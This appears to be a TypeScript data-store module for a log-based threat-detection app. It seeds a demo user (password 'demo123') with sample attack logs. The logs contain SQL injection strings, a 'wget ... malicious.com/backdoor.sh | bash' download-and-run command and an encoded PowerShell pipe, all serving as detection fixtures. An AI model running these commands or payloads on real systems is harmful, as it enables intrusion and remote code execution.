/**
 * SecureLogTI - User Data Store
 * In-memory data store with user isolation
 *
 * This simulates a database where each user has their own isolated data.
 * In production, this would be replaced with actual database queries
 * filtered by userId.
 */

import type { User, LogEntry, ThreatIntelligence, SecurityEvent, SecurityAlert } from "./types"
import { hashPassword } from "./auth"
import { analyzeUserLogs } from "./threat-algorithm"
import { analyzeIpReputation } from "./ip-reputation-check"

// In-memory stores (simulating database tables)
const users: User[] = []
const logs: Map<string, LogEntry[]> = new Map() // userId -> logs
const threats: Map<string, ThreatIntelligence[]> = new Map() // userId -> threats
const events: Map<string, SecurityEvent[]> = new Map() // userId -> events
const alerts: Map<string, SecurityAlert[]> = new Map() // userId -> alerts

// Initialize with a demo user
function initializeStore() {
  if (users.length === 0) {
    const demoUser: User = {
      id: "demo-user-1",
      email: "demo@securelogti.com",
      name: "Demo User",
      passwordHash: hashPassword("demo123"),
      createdAt: new Date("2025-01-01"),
      lastLogin: new Date(),
    }
    users.push(demoUser)

    // Initialize empty arrays for demo user
    logs.set(demoUser.id, generateSampleLogs(demoUser.id))
    threats.set(demoUser.id, [])
    events.set(demoUser.id, [])
    alerts.set(demoUser.id, [])

    // Analyze initial logs to generate threats
    analyzeLogsForThreats(demoUser.id)
  }
}

// Generate sample logs for demo user
function generateSampleLogs(userId: string): LogEntry[] {
  const sampleLogs: LogEntry[] = [
    // Brute Force Attack Logs
    {
      id: "log-1",
      userId,
      timestamp: new Date("2025-01-16T10:30:00"),
      sourceIp: "192.168.1.100",
      logType: "auth",
      message: "Failed password for admin from 192.168.1.100 port 22 ssh2",
      severity: "warning",
      rawLog: "Jan 16 10:30:00 server sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2",
      parsedAt: new Date(),
    },
    {
      id: "log-1b",
      userId,
      timestamp: new Date("2025-01-16T10:31:00"),
      sourceIp: "192.168.1.100",
      logType: "auth",
      message: "Failed password for root from 192.168.1.100 port 22 ssh2",
      severity: "error",
      rawLog: "Jan 16 10:31:00 server sshd[1235]: Failed password for root from 192.168.1.100 port 22 ssh2",
      parsedAt: new Date(),
    },
    {
      id: "log-1c",
      userId,
      timestamp: new Date("2025-01-16T10:32:00"),
      sourceIp: "192.168.1.100",
      logType: "auth",
      message: "Invalid user guest from 192.168.1.100 port 22",
      severity: "warning",
      rawLog: "Jan 16 10:32:00 server sshd[1236]: Invalid user guest from 192.168.1.100 port 22",
      parsedAt: new Date(),
    },
    {
      id: "log-1d",
      userId,
      timestamp: new Date("2025-01-16T10:33:00"),
      sourceIp: "192.168.1.100",
      logType: "auth",
      message: "Authentication failure from 192.168.1.100",
      severity: "error",
      rawLog: "Jan 16 10:33:00 server sshd[1237]: Authentication failure for admin from 192.168.1.100",
      parsedAt: new Date(),
    },
    {
      id: "log-1e",
      userId,
      timestamp: new Date("2025-01-16T10:34:00"),
      sourceIp: "192.168.1.100",
      logType: "auth",
      message: "Failed password for test from 192.168.1.100 port 22 ssh2",
      severity: "error",
      rawLog: "Jan 16 10:34:00 server sshd[1238]: Failed password for test from 192.168.1.100 port 22 ssh2",
      parsedAt: new Date(),
    },

    // SQL Injection Logs
    {
      id: "log-2",
      userId,
      timestamp: new Date("2025-01-16T10:35:00"),
      sourceIp: "203.0.113.45",
      logType: "application",
      message: "GET /api/users?id=' OR '1'='1 HTTP/1.1 401",
      severity: "critical",
      rawLog: "203.0.113.45 - - [16/Jan/2025:10:35:00] GET /api/users?id=' OR '1'='1 HTTP/1.1 401",
      parsedAt: new Date(),
    },
    {
      id: "log-2b",
      userId,
      timestamp: new Date("2025-01-16T10:36:00"),
      sourceIp: "203.0.113.45",
      logType: "application",
      message: "POST /api/login - UNION SELECT * FROM users",
      severity: "critical",
      rawLog: "203.0.113.45 - - [16/Jan/2025:10:36:00] POST /api/login - UNION SELECT * FROM users",
      parsedAt: new Date(),
    },

    // Malware Detection Logs
    {
      id: "log-3",
      userId,
      timestamp: new Date("2025-01-16T10:40:00"),
      sourceIp: "45.33.32.156",
      logType: "system",
      message: "Suspicious command detected: wget http://malicious.com/backdoor.sh | bash",
      severity: "critical",
      rawLog: "Jan 16 10:40:00 server kernel: wget http://malicious.com/backdoor.sh | bash",
      parsedAt: new Date(),
    },
    {
      id: "log-3b",
      userId,
      timestamp: new Date("2025-01-16T10:41:00"),
      sourceIp: "45.33.32.156",
      logType: "system",
      message: "Malware detection: base64 -d encoded_payload.txt | powershell -c",
      severity: "critical",
      rawLog: "Jan 16 10:41:00 server antivirus: base64 -d encoded_payload.txt | powershell -c",
      parsedAt: new Date(),
    },

    // DDoS Attack Logs
    {
      id: "log-4",
      userId,
      timestamp: new Date("2025-01-16T10:45:00"),
      sourceIp: "198.51.100.50",
      logType: "firewall",
      message: "429 Too Many Requests from 198.51.100.50 - Rate limit exceeded",
      severity: "critical",
      rawLog: "Jan 16 10:45:00 firewall nginx: 429 Too Many Requests from 198.51.100.50",
      parsedAt: new Date(),
    },
    {
      id: "log-4b",
      userId,
      timestamp: new Date("2025-01-16T10:46:00"),
      sourceIp: "198.51.100.50",
      logType: "firewall",
      message: "Service Unavailable - DDoS protection activated",
      severity: "critical",
      rawLog: "Jan 16 10:46:00 firewall: Service Unavailable - too many requests detected",
      parsedAt: new Date(),
    },
    {
      id: "log-4c",
      userId,
      timestamp: new Date("2025-01-16T10:47:00"),
      sourceIp: "198.51.100.50",
      logType: "firewall",
      message: "Connection timeout - multiple failed attempts from 198.51.100.50",
      severity: "critical",
      rawLog: "Jan 16 10:47:00 firewall: Connection timeout from 198.51.100.50",
      parsedAt: new Date(),
    },

    // Web Brute Force Logs
    {
      id: "log-5",
      userId,
      timestamp: new Date("2025-01-16T10:50:00"),
      sourceIp: "172.16.0.100",
      logType: "application",
      message: "POST /login - 401 Unauthorized",
      severity: "warning",
      rawLog: "172.16.0.100 - - [16/Jan/2025:10:50:00] POST /login HTTP/1.1 401",
      parsedAt: new Date(),
    },
    {
      id: "log-5b",
      userId,
      timestamp: new Date("2025-01-16T10:51:00"),
      sourceIp: "172.16.0.100",
      logType: "application",
      message: "POST /signin - 403 Forbidden",
      severity: "warning",
      rawLog: "172.16.0.100 - - [16/Jan/2025:10:51:00] POST /signin HTTP/1.1 403",
      parsedAt: new Date(),
    },
    {
      id: "log-5c",
      userId,
      timestamp: new Date("2025-01-16T10:52:00"),
      sourceIp: "172.16.0.100",
      logType: "application",
      message: "POST /admin/login - 401 Unauthorized",
      severity: "warning",
      rawLog: "172.16.0.100 - - [16/Jan/2025:10:52:00] POST /admin/login HTTP/1.1 401",
      parsedAt: new Date(),
    },

    // Additional normal logs
    {
      id: "log-6",
      userId,
      timestamp: new Date("2025-01-16T10:25:00"),
      sourceIp: "10.0.0.50",
      logType: "firewall",
      message: "Normal network traffic",
      severity: "info",
      rawLog: "Jan 16 10:25:00 firewall kernel: ACCEPT IN=eth0 SRC=10.0.0.50 DST=192.168.1.1 PROTO=TCP DPT=80",
      parsedAt: new Date(),
    },
  ]
  return sampleLogs
}

// Initialize on module load
initializeStore()

// ===== USER OPERATIONS =====

export function findUserByEmail(email: string): User | undefined {
  return users.find((u) => u.email.toLowerCase() === email.toLowerCase())
}

export function findUserById(id: string): User | undefined {
  return users.find((u) => u.id === id)
}

export function createUser(user: User): void {
  users.push(user)
  logs.set(user.id, [])
  threats.set(user.id, [])
  events.set(user.id, [])
  alerts.set(user.id, [])
}

export function updateUserLastLogin(userId: string): void {
  const user = users.find((u) => u.id === userId)
  if (user) {
    user.lastLogin = new Date()
  }
}

// ===== LOG OPERATIONS (User-Isolated) =====

export function getUserLogs(userId: string): LogEntry[] {
  return logs.get(userId) || []
}

export function addUserLogs(userId: string, newLogs: Omit<LogEntry, "id" | "userId" | "parsedAt">[]): LogEntry[] {
  const userLogs = logs.get(userId) || []
  const addedLogs: LogEntry[] = newLogs.map((log, index) => ({
    ...log,
    id: `log-${Date.now()}-${index}`,
    userId,
    parsedAt: new Date(),
  }))

  logs.set(userId, [...userLogs, ...addedLogs])

  // Re-analyze threats after adding logs
  analyzeLogsForThreats(userId)

  return addedLogs
}

export function deleteUserLog(userId: string, logId: string): boolean {
  const userLogs = logs.get(userId) || []
  const filtered = userLogs.filter((l) => l.id !== logId)
  if (filtered.length < userLogs.length) {
    logs.set(userId, filtered)
    analyzeLogsForThreats(userId) // Re-analyze after deletion
    return true
  }
  return false
}

export function clearUserLogs(userId: string): void {
  logs.set(userId, [])
  threats.set(userId, [])
  events.set(userId, [])
}

// ===== THREAT OPERATIONS (User-Isolated) =====

export function getUserThreats(userId: string): ThreatIntelligence[] {
  return threats.get(userId) || []
}

export function updateThreatStatus(userId: string, threatId: string, status: ThreatIntelligence["status"]): boolean {
  const userThreats = threats.get(userId) || []
  const threat = userThreats.find((t) => t.id === threatId)
  if (threat) {
    threat.status = status
    return true
  }
  return false
}

// ===== ANALYTICS (User-Isolated) =====

export function getUserStats(userId: string) {
  const userLogs = logs.get(userId) || []
  const userThreats = threats.get(userId) || []

  const oneWeekAgo = new Date()
  oneWeekAgo.setDate(oneWeekAgo.getDate() - 7)

  const logsThisWeek = userLogs.filter((l) => l.parsedAt >= oneWeekAgo).length
  const suspiciousIps = new Set(userThreats.filter((t) => t.threatScore >= 40).map((t) => t.ipAddress)).size
  const highRiskThreats = userThreats.filter((t) => t.threatLevel === "high" && t.status === "active").length

  return {
    totalLogs: userLogs.length,
    suspiciousIps,
    highRiskThreats,
    logsThisWeek,
  }
}

export function getUserAttacksByDay(userId: string): { date: string; count: number }[] {
  const userLogs = logs.get(userId) || []
  const attackLogs = userLogs.filter(
    (l) => l.severity === "warning" || l.severity === "error" || l.severity === "critical",
  )

  // Group by date
  const byDay = new Map<string, number>()
  attackLogs.forEach((log) => {
    const date = log.timestamp.toISOString().split("T")[0]
    byDay.set(date, (byDay.get(date) || 0) + 1)
  })

  // Convert to array and sort
  return Array.from(byDay.entries())
    .map(([date, count]) => ({ date, count }))
    .sort((a, b) => a.date.localeCompare(b.date))
    .slice(-7) // Last 7 days
}

export function getUserTopAttackingIPs(
  userId: string,
): { ipAddress: string; attackCount: number; threatLevel: ThreatIntelligence["threatLevel"] }[] {
  const userThreats = threats.get(userId) || []

  return userThreats
    .filter((t) => t.status === "active")
    .sort((a, b) => b.threatScore - a.threatScore)
    .slice(0, 5)
    .map((t) => ({
      ipAddress: t.ipAddress,
      attackCount: t.failedLogins + t.repeatedAccess,
      threatLevel: t.threatLevel,
    }))
}

// ===== THREAT ANALYSIS ENGINE =====

function analyzeLogsForThreats(userId: string): void {
  const userLogs = logs.get(userId) || []

  // Use the original threat-algorithm which works fine
  const analyzed = analyzeUserLogs(userLogs, userId)

  // Enrich with IP reputation data from ip-reputation-check
  const newThreats = analyzed.map((t) => ({
    ...t,
    enrichment: {
      ...(analyzeIpReputation(t.ipAddress).reputation),
    },
  }))

  threats.set(userId, newThreats)

  // Generate alerts from detected threats
  generateAlertsFromThreats(userId)
}

// ===== ALERT OPERATIONS (User-Isolated) =====

export function getUserAlerts(userId: string): SecurityAlert[] {
  return alerts.get(userId) || []
}

export function getActiveAlerts(userId: string): SecurityAlert[] {
  const userAlerts = alerts.get(userId) || []
  return userAlerts.filter((a) => a.status === "new" || a.status === "acknowledged")
}

export function createAlertFromThreat(userId: string, threat: ThreatIntelligence, attackType: string): SecurityAlert {
  // Map attack type to alert type and severity
  const alertTypeMap: Record<string, { type: "brute_force" | "sql_injection" | "malware" | "ddos_attack" | "suspicious_activity"; severity: "low" | "medium" | "high" | "critical" }> = {
    ssh_bruteforce: { type: "brute_force", severity: "high" },
    web_bruteforce: { type: "brute_force", severity: "high" },
    sql_injection: { type: "sql_injection", severity: "critical" },
    malware_suspicious_activity: { type: "malware", severity: "critical" },
    ddos_attack: { type: "ddos_attack", severity: "critical" },
  }

  const config = alertTypeMap[attackType] || { type: "suspicious_activity" as const, severity: "medium" as const }

  const alert: SecurityAlert = {
    id: `alert-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    userId,
    alertType: config.type,
    severity: config.severity,
    title: `${attackType.replace(/_/g, " ").toUpperCase()} Attack Detected`,
    description: threat.description,
    sourceIp: threat.ipAddress,
    timestamp: threat.lastSeen,
    detectedAt: new Date(),
    status: "new",
    threatId: threat.id,
    indicators: {
      threatScore: threat.threatScore,
      threatLevel: threat.threatLevel,
      detectedAttackTypes: threat.detectedAttackTypes,
      failedLogins: threat.failedLogins,
      totalSuspiciousEvents: threat.totalSuspiciousEvents,
    },
    recommendation: getAlertRecommendation(config.type, threat),
  }

  const userAlerts = alerts.get(userId) || []
  userAlerts.push(alert)
  alerts.set(userId, userAlerts)

  return alert
}

function getAlertRecommendation(alertType: string, threat: ThreatIntelligence): string {
  const recommendations: Record<string, string> = {
    brute_force: `Block IP ${threat.ipAddress} and enable multi-factor authentication. Review access logs for successful unauthorized access.`,
    sql_injection: `Immediately patch the vulnerable parameter. Review database for unauthorized access. Audit data integrity.`,
    malware: `Isolate affected systems from network. Run comprehensive antivirus/malware scan. Check for persistence mechanisms.`,
    ddos_attack: `Activate DDoS mitigation. Rate limit requests. Notify ISP. Route traffic through DDoS protection service.`,
    suspicious_activity: `Monitor IP closely. Review all activities from this IP. Investigate the source and intent.`,
  }
  return recommendations[alertType] || "Continue monitoring and investigate further."
}

export function generateAlertsFromThreats(userId: string): void {
  const userThreats = threats.get(userId) || []
  const userAlerts = alerts.get(userId) || []

  userThreats.forEach((threat) => {
    if (threat.detectedAttackTypes && threat.detectedAttackTypes.length > 0) {
      threat.detectedAttackTypes.forEach((attackType) => {
        // Check if alert already exists for this threat and attack type
        const alertExists = userAlerts.some(
          (a) => a.threatId === threat.id && a.status === "new"
        )

        if (!alertExists) {
          createAlertFromThreat(userId, threat, attackType)
        }
      })
    }
  })
}

export function updateAlertStatus(userId: string, alertId: string, status: SecurityAlert["status"]): void {
  const userAlerts = alerts.get(userId) || []
  const alert = userAlerts.find((a) => a.id === alertId)
  if (alert) {
    alert.status = status
  }
}

export function dismissAlert(userId: string, alertId: string): void {
  updateAlertStatus(userId, alertId, "resolved")
}
